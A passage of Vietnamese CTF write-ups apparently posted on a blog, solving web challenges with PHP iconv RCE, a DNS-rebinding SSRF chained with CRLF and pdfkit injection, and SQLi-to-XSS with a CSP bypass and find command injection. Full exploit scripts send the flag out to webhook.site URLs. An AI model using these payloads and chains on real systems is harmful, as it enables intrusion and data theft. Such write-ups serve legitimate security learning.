+    except Exception as e:
+        # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)
+        print(f&#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&#39;)
+    
+    # 3. Đợi hệ thống đồng bộ file
+    import time
+    print(&#39;[*] Đợi 2 giây để lệnh thực thi xong...&#39;)
+    time.sleep(2)
+    
+    # 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)
+    print(&#39;[*] Đang đọc kết quả từ /tmp/check_id...&#39;)
+    try:
+        # Dùng chính tính năng SplFileObject để đọc file kết quả
+        result = get_file(URL, &#34;/tmp/check_id&#34;)
+        
+        if result:
+            print(&#39;\n[+] KẾT QUẢ COMMAND ID:&#39;)
+            print(&#39;=&#39;*40)
+            print(result.decode(&#39;utf-8&#39;).strip())
+            print(&#39;=&#39;*40)
+        else:
+            print(&#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&#39;)
+            
+    except Exception as e:
+        print(f&#39;[-] Lỗi khi đọc file kết quả: {e}&#39;)
+
+if __name__ == &#34;__main__&#34;:
+    solve()
+</code></pre><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SyU18T4I-g.png"></p>
+<ul>
+<li>Bây giờ để lấy flag cần sử dụng binary <code>/readflag</code>. Trong Dockerfile binary này đã được cấp quyền <code>SUID</code> tức là khi user <code>nobody</code> chạy nó, nó sẽ thực thi với quyền của chủ sở hữu file (là root)</li>
+</ul>
+<pre tabindex="0"><code class="language-php=" data-lang="php=">def solve():
+    URL = &#39;http://localhost:5000/&#39;
+    
+    # Output được ghi vào /tmp/flag_result để user nobody có thể đọc lại sau đó
+    command = &#39;/readflag &gt; /tmp/flag_result&#39;
+    
+    print(f&#39;[+] Đang tạo payload cho lệnh: {command}&#39;)
+    
+    path = PWN_Core(URL, command).build_exploit_path()
+    
+    # 1. Gửi Exploit (Trigger RCE)
+    try:
+        print(&#39;[*] Đang gửi payload kích hoạt RCE...&#39;)
+        # Gửi request để kích hoạt lỗi iconv, server dự kiến sẽ crash (trả về 502)
+        encoded_path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+        session.post(URL + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
+        session.post(URL + &#39;index.php&#39;, data={&#39;note&#39;: encoded_path})
+        session.post(URL + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
+        session.get(URL + &#39;index.php&#39;, timeout=5)
+    except Exception as e:
+        print(f&#39;[!] Server đã crash/phản hồi (Dấu hiệu tốt): {e}&#39;)
+    
+    # 2. Đợi hệ thống xử lý
+    import time
+    print(&#39;[*] Đợi 2 giây để lệnh /readflag thực thi xong...&#39;)
+    time.sleep(2)
+    
+    # 3. Đọc kết quả từ file tạm bằng kỹ thuật LFI cũ
+    print(&#39;[*] Đang đọc flag từ /tmp/flag_result...&#39;)
+    try:
+        # Sử dụng lại hàm get_file (SplFileObject) để đọc file kết quả
+        flag = get_file(URL, &#34;/tmp/flag_result&#34;)
+        
+        if flag:
+            print(&#39;\n&#39; + &#39;=&#39;*40)
+            print(f&#34;FLAG: {flag.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;).strip()}&#34;)
+            print(&#39;=&#39;*40 + &#39;\n&#39;)
+        else:
+            print(&#39;[-] Không đọc được flag. Có thể exploit thất bại hoặc file không tồn tại.&#39;)
+            
+    except Exception as e:
+        print(f&#39;[-] Lỗi khi đọc file flag: {e}&#39;)
+
+if __name__ == &#34;__main__&#34;:
+    solve()
+</code></pre><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sk4YUaELbg.png"></p>
+<p><strong>Flag: 0xL4ugh{1think_y0u_l0ved_my_pHp_n0te_e1bfd312v_dc754541a1d6a4fd}</strong></p>
+<h1 id="pdfexe">pdf.exe<a hidden class="anchor" aria-hidden="true" href="#pdfexe">#</a></h1>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sy8Srer8-e.png"></p>
+<h2 id="overview-1">Overview<a hidden class="anchor" aria-hidden="true" href="#overview-1">#</a></h2>
+<ul>
+<li><strong>DNS Rebinding SSRF</strong> in Next.js Image Optimizer để chạm tới dịch vụ nội bộ</li>
+<li><strong>CRLF Injection</strong> in Python&rsquo;s <code>urllib.request</code> <code>data:</code> URI handler để chèn header độc hại vào gói tin</li>
+<li><strong>pdfkit Argument Injection</strong> via <strong>injected HTML meta tags</strong> để lấy được nội dung của flag từ dịch vụ nội bộ</li>
+</ul>
+<h2 id="nextjs-image-optimizer-ssrf">Next.js Image Optimizer SSRF<a hidden class="anchor" aria-hidden="true" href="#nextjs-image-optimizer-ssrf">#</a></h2>
+<ul>
+<li>
+<p>Trước tiên ta sẽ gặp được cấu hình file <code>next.config.ts</code> như sau :
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1IpmXdU-g.png">
+=&gt;  Willcard <code>hostname: &quot;**&quot;</code> cho phép tối ưu hình ảnh từ việc lấy ảnh từ bất kì host <code>HTTP</code> nào
+=&gt; Đối với endpoint <code>/_next/image</code> nếu kiểm soát được <code>url</code> ta có thể <strong>SSRF</strong> vào dịch vụ nội bộ</p>
+</li>
+<li>
+<p>Đối với endpoint <code>/_next/image</code> chấp nhạn 3 tham số</p>
+</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th>Tham số</th>
+          <th>Chức năng</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>url</td>
+          <td>Url của ảnh và tối ưu</td>
+      </tr>
+      <tr>
+          <td>w</td>
+          <td>Chiều rộng mong muốn</td>
+      </tr>
+      <tr>
+          <td>q</td>
+          <td>Số lượng</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>
+<p>Request sẽ như sau : <code>GET /_next/image?url=https://example.com/photo.jpg&amp;w=640&amp;q=75</code></p>
+</li>
+<li>
+<p>Thực hiện SSRF cổ điển như sau <code>GET /_next/image?url=http://127.0.0.1:5000/generate&amp;w=640&amp;q=75</code> nhưng đương nhiên sẽ bị chặn</p>
+</li>
+<li>
+<p>Giờ đến lúc đâm sâu vào src với <a href="https://github.com/vercel/next.js/blob/canary/packages/next/src/server/image-optimizer.ts">hàm <code>fetchExternalImage</code></a></p>
+</li>
+<li>
+<p>Hàm này sẽ có chức năng như sau :</p>
+<ul>
+<li>Parse hostname từ ip</li>
+<li>Resolve DNS để chuyển về ip</li>
+<li>Kiểm tra xem có phải ip nội bộ không</li>
+<li>Nếu là IP nội bộ thì chặn</li>
+<li>Còn nếu không thì cho qua</li>
+</ul>
+</li>
+<li>
+<p>Auke đây sẽ là lúc Time-of-Check to Time-of-Use <strong>(TOCTOU)</strong></p>
+</li>
+<li>
+<p>Thời gian server kiểm tra ip riêng sẽ là lúc ta thực hiện request đến mục tiêu</p>
+</li>
+<li>
+<p>Sử dụng cái này để <a href="https://lock.cmpxchg8b.com/rebinder.html">DNS rebinding</a></p>
+</li>
+<li>
+<p>You control a domain</p>
+</li>
+<li>
+<p>The DNS server is configured with a very low TTL and alternates responses:</p>
+<ul>
+<li>First query -&gt; 1.2.3.4 (public IP, passes validation)</li>
+<li>Second query -&gt; 127.0.0.1 (private IP, actual target)</li>
+</ul>
+</li>
+<li>
+<p>Image optimizer:</p>
+<ul>
+<li>Resolves evil.mushroom.cat -&gt; 1.2.3.4 ✅ (validation passes)</li>
+<li>Calls fetch(evil.mushroom.cat) -&gt; DNS resolves again -&gt; 127.0.0.1 Request hits localhost! ✅✅✅✅</li>
+</ul>
+</li>
+<li>
+<p>URl sẽ như sau <code>GET /_next/image?url=http://7f000001.8efab5ae.rbndr.us:5000/generate?data=...&amp;w=640&amp;q=75</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJpe1LdLZl.png"></p>
+</li>
+</ul>
+<h2 id="python-urllib-crlf-injection-in-data-uris">Python urllib CRLF Injection in (<code>data:</code>) URIs<a hidden class="anchor" aria-hidden="true" href="#python-urllib-crlf-injection-in-data-uris">#</a></h2>
+<ul>
+<li>
+<p>Như ta thấy dataURI được ta kiểm soát hoàn toàn và nó chỉ fillter đơn giản bới <code>data_uri.startswith(&quot;data:plain/text&quot;):</code> kiểm tra xem có bắt đầu chuỗi bằng <code>data:plain/text</code> không .
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rySheLdIbe.png"></p>
+</li>
+<li>
+<p>Ngay sau đó <code>datauri</code> sẽ rơi vào <code>urlopen</code> và <code>Python's urllib.request</code> sẽ xứ lí <code>data: URIs</code> through the <code>DataHandler class</code>.
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HJ-VbLd8bg.png"></p>
+</li>
+<li>
+<p><code>Data:</code> URI  sẽ có dạng <code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code></p>
+</li>
+<li>
+<p>Hàm <code>email.message_from_string()</code> xử lí headers. Headers được tách bới newline (<code>\r\n</code> or  <code>\n</code>). Vậy nên ta chèn (<code>%0A</code>) vào phần mediatype</p>
+</li>
+</ul>
+<pre tabindex="0"><code class="language-code=" data-lang="code=">data:plain/text%0AContent-Disposition: malicious-header,mushroom
+
+    ||
+    ||
+    \/
+Content-Type: plain/text
+Content-Disposition: malicious-header
+</code></pre><ul>
+<li>Chúng ta sẽ chèn vào header <code>Content-Disposition</code> bới nó sẽ được đưa vào pdfkit lúc sau</li>
+</ul>
+<h2 id="pdfkit-argument-injection-the-flag-exfiltration">pdfkit Argument Injection (The Flag Exfiltration)<a hidden class="anchor" aria-hidden="true" href="#pdfkit-argument-injection-the-flag-exfiltration">#</a></h2>
+<ul>
+<li>
+<p>pdfkit là tool để chuyển từ HTML sang pdf</p>
+</li>
+<li>
+<p>Chúng ta có thể inject vào 1 đoạn html để lợi dụng 1 số chức năng để đọc flag
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rkmt4UuU-l.png"></p>
+</li>
+<li>
+<p>Như vậy payload sẽ như sau :</p>
+</li>
+</ul>
+<pre tabindex="0"><code class="language-code=" data-lang="code=">&lt;meta name=&#34;pdfkit-post-file&#34; content=&#34;&#34;&gt;
+&lt;meta name=&#34;pdfkit-leak-data&#34; content=&#34;/flag&#34;&gt;
+&lt;meta name=&#34;pdfkit-https://webhook.site/XXXX/&#34; content=&#34;--cache-dir&#34;&gt;
+</code></pre><ul>
+<li>Payload sẽ được hình dung như sau :
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1HmdI_IWx.png"></li>
+<li>Double encode url ta được payload ⬇️</li>
+</ul>
+<h2 id="final-exploit">Final exploit<a hidden class="anchor" aria-hidden="true" href="#final-exploit">#</a></h2>
+<pre tabindex="0"><code class="language-code=" data-lang="code=">import requests
+import time
+
+paylaod = &#34;http%3A%2F%2F7f000001.8efac8ce.rbndr.us%3A5000%2Fgenerate%3Fdata%3Ddata%3Aplain%2Ftext%250AContent-Disposition%3A%253Cmeta%2520name%3D%2522pdfkit-post-file%2522%2520content%3D%2522%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-leak-data%2522%2520content%3D%2522%2Fflag%2522%253E%2520%253Cmeta%2520name%3D%2522pdfkit-https%3A%2F%2Fwebhook.site%2F1738ce87-4a08-47ae-9cd5-323dc449cb7d%2F%3Fq%3D--%2522%2520content%3D%2522--cache-dir%2522%253E%2Ccanelo&#34;
+
+r =  f&#34;http://165.227.157.69/_next/image?url={paylaod}&amp;w=256&amp;q=75&amp;&#34;
+
+print(&#34;Attack started check your webhook&#34;)
+
+while True:
+    _ = requests.get(r)
+    time.sleep(0.1)
+</code></pre><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SkZfrUOUbl.png"></p>
+<ul>
+<li>LƯU Ý : chall này không thực hiện được trên local bới đặc tính của NextJS
+<strong>FLAG : 0xL4ugh{my_pdfs_are_something_else_right?_179453d559cb1bec}</strong></li>
+</ul>
+<h1 id="smol-web">Smol Web<a hidden class="anchor" aria-hidden="true" href="#smol-web">#</a></h1>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SyeNttP8bx.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/r1nQ0FvLWl.png"></p>
+<h2 id="phân-tích">Phân tích<a hidden class="anchor" aria-hidden="true" href="#phân-tích">#</a></h2>
+<ul>
+<li>web service (port 5000): xem và đánh giá sản phẩm</li>
+<li>bot service (port 3000): admin bot sử dụng puppeteer để visit URL được report</li>
+</ul>
+<h3 id="appdockerfile"><code>app/Dockerfile</code><a hidden class="anchor" aria-hidden="true" href="#appdockerfile">#</a></h3>
+<ul>
+<li>Flag nằm trong biến môi trường, chỉ có thể đọc qua binary <code>/readflagbinary</code> (được set quyền SUID) =&gt; RCE</li>
+</ul>
+<h3 id="appmainpy"><code>app/main.py</code><a hidden class="anchor" aria-hidden="true" href="#appmainpy">#</a></h3>
+<ul>
+<li>
+<p>endpoint <code>/ratings</code> lấy tham số <code>quantity</code> và đưa trực tiếp vào lệnh SQL qua <code>f-string</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1PEk5v8Wg.png"></p>
+</li>
+<li>
+<p>Có filet <code>'</code> và <code>&quot;</code> nhưng vì đây là interger nên không cần dấu nháy để injection</p>
+</li>
+<li>
+<p>Sau khi query bảng <code>products</code> code lấy <code>user_id</code> từ kết quả để query bảng <code>users</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HkmQxqD8-x.png"></p>
+</li>
+<li>
+<p><code>r['user_id']</code> là dữ liệu ta control được từ câu query trên</p>
+</li>
+<li>
+<p>Tại <code>templates/ratings_page.html</code> creator được render với filter <code>safe</code>:
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BkN_x9PI-x.png"></p>
+</li>
+</ul>
+<p>=&gt; Chain: inject payload vào cột <code>user_id</code> ở query 1 -&gt; payload đó trở thành câu SQL query 2 -&gt; trả về XSS payload vào biến <code>name</code> -&gt; render ra HTML</p>
+<h3 id="endpoint-search-chỉ-access-được-từ-localhost-từ-phía-bot">Endpoint /search (chỉ access được từ localhost (từ phía bot)<a hidden class="anchor" aria-hidden="true" href="#endpoint-search-chỉ-access-được-từ-localhost-từ-phía-bot">#</a></h3>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SkgxZcwLWx.png"></p>
+<ul>
+<li>Hàm <code>sanitize_input</code> chặn nhiều ký tự và các lệnh <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ryxSbcwIWe.png"></li>
+<li>Nhưng <code>find</code> command có tuỳ chọn <code>-exec</code> =&gt; cần bypass filter để chạy <code>/readflagbinary</code></li>
+</ul>
+<h2 id="vuln">Vuln<a hidden class="anchor" aria-hidden="true" href="#vuln">#</a></h2>
+<ol>
+<li><strong>SQL Injection (stage 1)</strong>: inject còn <code>quantity</code> để control cột <code>user_id</code> trả về</li>
+<li><strong>SQLi (stage 2)</strong>: sử dụng giá trị <code>user_id</code> độc hại để Union Select ra payload XSS</li>
+<li><strong>Reflected XSS</strong>: payload XSS hiển trị trên trang <code>/ratings</code></li>
+<li><strong>CSP bypass</strong> sử dụng JSONP endpoint của youtube (<code>/oembed</code>) để execute JS</li>
+<li><strong>SSRF/local access</strong>: dùng bot để trigger request tới <code>/search</code> (endpoint nội bộ)</li>
+<li><strong>Command Injection</strong>: inject tham số cho lẹnh <code>find</code> để thực thi <code>/readflagbinary</code></li>
+</ol>
+<h2 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h2>
+<h3 id="bypass-filter-và-payload-encoding">Bypass filter và payload encoding<a hidden class="anchor" aria-hidden="true" href="#bypass-filter-và-payload-encoding">#</a></h3>
+<ul>
+<li>Do <code>quantity</code> chặn dấu nháy <code>'</code> nên không thể viết string trực tiếp =&gt; Dùng hàm <code>CHAR(ascii_code)</code> của SQLite và nối chuỗi bằng <code>||</code></li>
+</ul>
+<h3 id="tạo-payload-xss-để-bypass-csp">Tạo payload XSS để bypass CSP<a hidden class="anchor" aria-hidden="true" href="#tạo-payload-xss-để-bypass-csp">#</a></h3>
+<ul>
+<li>không thể dùng <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> =&gt; dùng gadget youtube
+<code>&lt;script src=&quot;https://www.youtube.com/oembed?callback=...Javascript...&quot;&gt;&lt;/script&gt;</code></li>
+<li>Đoạn JS trong callback sẽ:
+<ul>
+<li>Tạo <code>XMLHttpRequest</code> POST tới <code>/search</code></li>
+<li>Gửi body: <code>search=-exec /*e*b*y ;</code></li>
+<li>Đọc response (output của lệnh <code>find</code>)</li>
+<li>Gửi flag về webhook qua <code>location</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="bypass-filter-tại-search">Bypass filter tại <code>/search</code><a hidden class="anchor" aria-hidden="true" href="#bypass-filter-tại-search">#</a></h3>
+<ul>
+<li>Lệnh cần chạy: <code>/readflagbinary</code>. Filter block: <code>r, l, f, a, d...</code> . Filter allow: <code>e, b, y, *, /</code> Payload: <code>/*e*b*y</code>
+<ul>
+<li><code>/</code> : Root</li>
+<li><code>*</code> : match <code>readflag</code></li>
+<li><code>b</code> : match <code>b</code></li>
+<li><code>*</code> : match <code>inar</code></li>
+<li><code>y</code> : match <code>y</code> =&gt; find sẽ execute: <code>/readflagbinary</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="chain-sqli">Chain SQLi<a hidden class="anchor" aria-hidden="true" href="#chain-sqli">#</a></h3>
+<ul>
+<li>
+<p>Ta cần nhúng XSS payload vào <code>user_name</code></p>
+<ul>
+<li>query 2 (inner): <code>0 UNION SELECT 1, '&lt;script...XSS...&gt;'</code></li>
+<li>query 1 (outer): <code>quantity = 0 UNION SELECT 1, 2, 3, (payload query 2 đã encode CHAR)</code></li>
+</ul>
+</li>
+<li>
+<p>Khi server chạy:</p>
+<ul>
+<li>query 1 trả về <code>user_id</code> là chuỗi SQL <code>&quot;0 UNION SELECT...&quot;</code></li>
+<li>query 2 chạy: <code>SELECT ... WHERE id = 0 UNION SELECT 1, '&lt;script...&gt;'</code></li>
+<li>User name là đoạn script</li>
+<li>HTML render đoạn script -&gt; Bot chạy script -&gt; RCE -&gt; Lấy Flag</li>
+</ul>
+</li>
+</ul>
+<h2 id="full-script">Full script:<a hidden class="anchor" aria-hidden="true" href="#full-script">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [CONFIG] Thay đổi URL target và Webhook của bạn</span>
+</span></span><span style="display:flex;"><span>TARGET_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://challenges2.ctf.sd:35129&#34;</span>
+</span></span><span style="display:flex;"><span>WEBHOOK <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://webhook.site/0c04e078-b97c-4c59-82a9-fc5f06f2eea8&#34;</span> <span style="color:#75715e"># Thay bằng webhook của bạn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_char</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Chuyển đổi string sang dạng SQLite CHAR() để bypass filter dấu nháy (&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Ví dụ: &#39;ABC&#39; -&gt; CHAR(65,66,67)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    chars <span style="color:#f92672">=</span> [str(ord(c)) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> s]
+</span></span><span style="display:flex;"><span>    chunks <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Chia nhỏ để tránh giới hạn tham số nếu có</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(chars), <span style="color:#ae81ff">40</span>):
+</span></span><span style="display:flex;"><span>        chunk <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">.</span>join(chars[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>])
+</span></span><span style="display:flex;"><span>        chunks<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CHAR(</span><span style="color:#e6db74">{</span>chunk<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;||&#34;</span><span style="color:#f92672">.</span>join(chunks)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_payload</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Generating Exploit Payload...&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 1. Javascript Payload: Chạy trên browser của Bot</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Nhiệm vụ: POST vào /search để kích hoạt Command Injection, sau đó gửi kết quả về Webhook</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Payload cmd injection: -exec /*e*b*y ;  (Tương đương: -exec /readflagbinary ;)</span>
+</span></span><span style="display:flex;"><span>    js_code <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;var xhr=new XMLHttpRequest();&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;xhr.open(&#39;POST&#39;,&#39;/search&#39;,true);&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;xhr.setRequestHeader(&#39;Content-Type&#39;,&#39;application/x-www-form-urlencoded&#39;);&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;xhr.onload=function(){&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;var d=new DOMParser().parseFromString(xhr.responseText,&#39;text/html&#39;);&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;var output=d.querySelector(&#39;pre&#39;).textContent;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;location=&#39;&#34;</span> <span style="color:#f92672">+</span> WEBHOOK <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?flag=&#39;+btoa(output)&#34;</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;};&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;xhr.send(&#39;search=-exec /*e*b*y ;&#39;);&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Encode JS để nhúng vào callback của Youtube</span>
+</span></span><span style="display:flex;"><span>    encoded_js <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(js_code)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 2. XSS Payload: Bypass CSP bằng Youtube Oembed</span>
+</span></span><span style="display:flex;"><span>    xss_tag <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&lt;script src=&#34;https://www.youtube.com/oembed?callback=</span><span style="color:#e6db74">{</span>encoded_js<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;&lt;/script&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 3. Inner SQL Injection (Query 2): Để inject XSS vào tên user</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Cấu trúc: 0 UNION SELECT 1, &#39;PAYLOAD_XSS&#39;</span>
+</span></span><span style="display:flex;"><span>    inner_sqli <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0 UNION SELECT 1,&#39;</span><span style="color:#e6db74">{</span>xss_tag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Encode Inner SQLi sang CHAR() để tránh dấu nháy trong Outer SQLi</span>
+</span></span><span style="display:flex;"><span>    char_payload <span style="color:#f92672">=</span> to_char(inner_sqli)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 4. Outer SQL Injection (Query 1): Inject vào tham số quantity</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Cột thứ 4 là user_id, ta nhét payload inner vào đây</span>
+</span></span><span style="display:flex;"><span>    final_sqli <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0 UNION SELECT 1,2,3,</span><span style="color:#e6db74">{</span>char_payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Final Payload (for quantity param):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>final_sqli<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> final_sqli
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_exploit</span>(payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Đường dẫn mà Bot sẽ visit. </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Bot sẽ truy cập: http://web:5000/ratings?quantity=...</span>
+</span></span><span style="display:flex;"><span>    path_to_visit <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/ratings?quantity=</span><span style="color:#e6db74">{</span>urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    report_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET_URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/report&#34;</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Sending report to: </span><span style="color:#e6db74">{</span>report_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Bot will visit: </span><span style="color:#e6db74">{</span>path_to_visit<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(report_url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;url&#34;</span>: path_to_visit})
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[+] Report sent successfully! Check your webhook.&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;] Webhook URL: </span><span style="color:#e6db74">{</span>WEBHOOK<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Failed to send report. Status: </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> generate_payload()
+</span></span><span style="display:flex;"><span>    send_exploit(payload)
+</span></span></code></pre></div><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Bkzjv9wLWe.png">
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BywsPcvIbl.png"></p>
+<h1 id="4lld4y">4llD4y<a hidden class="anchor" aria-hidden="true" href="#4lld4y">#</a></h1>
